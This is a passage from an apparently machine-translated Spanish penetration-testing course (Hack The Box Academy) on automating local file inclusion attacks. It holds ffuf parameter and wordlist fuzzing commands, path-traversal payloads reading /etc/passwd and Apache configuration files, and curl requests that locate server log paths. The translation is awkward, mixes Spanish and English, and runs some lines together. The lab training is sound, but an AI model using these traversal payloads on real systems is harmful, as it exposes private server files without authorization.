# Automated Scanning

Es esencial comprender cómo funcionan los ataques de inclusión de archivos y cómo podemos elaborar manualmente las cargas útiles avanzadas y usar técnicas personalizadas para alcanzar la ejecución de código remoto. Esto se debe a que en muchos casos, para que explotemos la vulnerabilidad, puede requerir una carga útil personalizada que coincida con sus configuraciones específicas. Además, cuando se trata de medidas de seguridad como un WAF o un firewall, tenemos que aplicar nuestra comprensión para ver cómo se bloquea una carga/carácter específica e intentar crear una carga útil personalizada para trabajar en su alrededor.

Es posible que no necesitemos explotar manualmente la vulnerabilidad de LFI en muchos casos triviales. Existen muchos métodos automatizados que pueden ayudarnos a identificar y explotar rápidamente las vulnerabilidades triviales de LFI. Podemos utilizar herramientas borrosas para probar una gran lista de cargas útiles de LFI comunes y ver si alguna de ellas funciona, o podemos utilizar herramientas LFI especializadas para probar tales vulnerabilidades. Esto es lo que discutiremos en esta sección.

---

# **Parámetros confusos**

Los formularios HTML que los usuarios pueden usar en el front-end de la aplicación web tienden a probarse correctamente y bien asegurados contra diferentes ataques web. Sin embargo, en muchos casos, la página puede tener otros parámetros expuestos que no están vinculados a ninguna forma HTML y, por lo tanto, los usuarios normales nunca accederían o causarían daño involuntariamente. Es por eso que puede ser importante para los parámetros expuestos, ya que tienden a no ser tan seguros como los públicos.

El[Atacando aplicaciones web con FFUF](https://academy.hackthebox.com/module/details/54)El módulo entra en detalles sobre cómo podemos luchar para`GET`/`POST`parámetros. Por ejemplo, podemos confundir la página para común`GET`Parámetros, como sigue:

Escaneo automático

```
xnoxos@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]

```

Una vez que identificamos un parámetro expuesto que no está vinculado a las formas que probamos, podemos realizar todas las pruebas de LFI discutidas en este módulo. Esto no es exclusivo de las vulnerabilidades de LFI, pero también se aplica a la mayoría de las vulnerabilidades web discutidas en otros módulos, ya que los parámetros expuestos también pueden ser vulnerables a cualquier otra vulnerabilidad.

**Consejo:**Para una exploración más precisa, podemos limitar nuestro escaneo a los parámetros LFI más populares que se encuentran en esto[enlace](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).

---

# **Listas de palabras LFI**

Hasta ahora en este módulo, hemos estado elaborando manualmente nuestras cargas de LFI para probar las vulnerabilidades de LFI. Esto se debe a que las pruebas manuales son más confiables y pueden encontrar vulnerabilidades de LFI que de otra manera no se pueden identificar, como se discutió anteriormente. Sin embargo, en muchos casos, es posible que deseemos ejecutar una prueba rápida en un parámetro para ver si es vulnerable a alguna carga útil LFI común, lo que puede ahorrarnos tiempo en aplicaciones web donde necesitamos probar varias vulnerabilidades.

Hay una serie de[Listas de palabras LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)Podemos usar para este escaneo. Una buena lista de palabras es[Lfi-jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), ya que contiene varios derivaciones y archivos comunes, por lo que facilita la ejecución de varias pruebas a la vez. Podemos usar esta lista de palabras para borrar el`?language=`Parámetro que hemos estado probando en todo el módulo, como sigue:

Escaneo automático

```
xnoxos@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]

```

Como podemos ver, el escaneo arrojó una serie de cargas útiles de LFI que se pueden usar para explotar la vulnerabilidad. Una vez que tengamos las cargas útiles identificadas, debemos probarlas manualmente para verificar que funcionen como se esperaba y mostrar el contenido del archivo incluido.

---

# **Archivos de servidor confuso**

Además de las cargas útiles LFI confusas, existen diferentes archivos de servidor que pueden ser útiles en nuestra explotación de LFI, por lo que sería útil saber dónde existen dichos archivos y si podemos leerlos. Tales archivos incluyen:`Server webroot path`, `server configurations file`, y`server logs`.

### **Avenida web**

Es posible que necesitemos conocer la ruta completa del servidor web para completar nuestra explotación en algunos casos. Por ejemplo, si queríamos localizar un archivo que subimos, pero no podemos alcanzar su`/uploads`Directorio a través de rutas relativas (por ejemplo`../../uploads`). En tales casos, es posible que necesitemos descubrir la ruta del Servidor Webroot para que podamos localizar nuestros archivos cargados a través de rutas absolutas en lugar de rutas relativas.

Para hacerlo, podemos luchar por el`index.php`Archivo a través de rutas de raíz web común, que podemos encontrar en este[lista de palabras para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)o esto[Lista de palabras para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Dependiendo de nuestra situación de LFI, es posible que necesitemos agregar algunos directorios de atrás (por ejemplo,`../../../../`), y luego agregue nuestro`index.php`Afterwords.

El siguiente es un ejemplo de cómo podemos hacer todo esto con FFUF:

Escaneo automático

```
xnoxos@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287...SNIP...

: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]

```

Como podemos ver, el escaneo realmente identificó la ruta correcta de raíz web en (`/var/www/html/`). También podemos usar lo mismo[Lfi-jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)Lista de palabras que utilizamos anteriormente, ya que también contiene varias cargas útiles que pueden revelar la raíz web. Si esto no nos ayuda a identificar la raíz web, entonces nuestra mejor opción sería leer las configuraciones del servidor, ya que tienden a contener la raíz web y otra información importante, como veremos a continuación.

### **Registros/configuraciones del servidor**

Como hemos visto en la sección anterior, necesitamos poder identificar el directorio de registros correcto para poder realizar los ataques de envenenamiento de registros que discutimos. Además, como acabamos de discutir, también es posible que necesitemos leer las configuraciones del servidor para poder identificar la ruta del Servidor Webroot y otra información importante (¡como la ruta de registros!).

Para hacerlo, también podemos usar el[Lfi-jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)Lista de palabras, ya que contiene muchos de los registros de servidores y las rutas de configuración que podemos estar interesados. Si queríamos un escaneo más preciso, podemos usar esto[lista de palabras para Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)o esto[Lista de palabras para Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), aunque no son parte de`seclists`, por lo que debemos descargarlos primero. Probemos la lista de palabras de Linux contra nuestra vulnerabilidad de LFI y veamos lo que obtenemos:

Escaneo automático

```
xnoxos@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]

```

Como podemos ver, el escaneo devolvió más de 60 resultados, muchos de los cuales no se identificaron con el[Lfi-jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)Lista de palabras, que nos muestra que una exploración precisa es importante en ciertos casos. Ahora, podemos intentar leer cualquiera de estos archivos para ver si podemos obtener su contenido. Leeremos (`/etc/apache2/apache2.conf`), ya que es una ruta conocida para la configuración del servidor Apache:

Escaneo automático

```
xnoxos@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog${APACHE_LOG_DIR}/error.log        CustomLog${APACHE_LOG_DIR}/access.log combined...SNIP...

```

Como podemos ver, obtenemos la ruta de raíz web predeterminada y la ruta de registro. Sin embargo, en este caso, la ruta log está utilizando una variable de Apache global (`APACHE_LOG_DIR`), que se encuentran en otro archivo que vimos anteriormente, que es (`/etc/apache2/envvars`), y podemos leerlo para encontrar los valores variables:

Escaneo automático

```
xnoxos@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pidexport APACHE_RUN_DIR=/var/run/apache2$SUFFIXexport APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.export APACHE_LOG_DIR=/var/log/apache2$SUFFIX...SNIP...

```

Como podemos ver, el (`APACHE_LOG_DIR`) La variable se establece en (`/var/log/apache2`), y la configuración anterior nos dijo que los archivos de registro son`/access.log`y`/error.log`, que han accedido en la sección anterior.

**Note:** Of course, we can simply use a wordlist to find the logs, as multiple wordlists we used in this sections did show the log location. But this exercises shows us how we can manually go through identified files, and then use the information we find to further identify more files and important information. This is quite similar to when we read different file sources in the `PHP filters`La sección, y dichos esfuerzos pueden revelar información previamente desconocida sobre la aplicación web, que podemos usar para explotarla aún más.

---

# **LFI Tools**

Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

Desafortunadamente, la mayoría de estas herramientas no se mantienen y confían en los obsoletos`python2`, por lo que usarlos puede no ser una solución a largo plazo. Intente descargar cualquiera de las herramientas anteriores y pruebas en cualquiera de los ejercicios que hemos utilizado en este módulo para ver su nivel de precisión.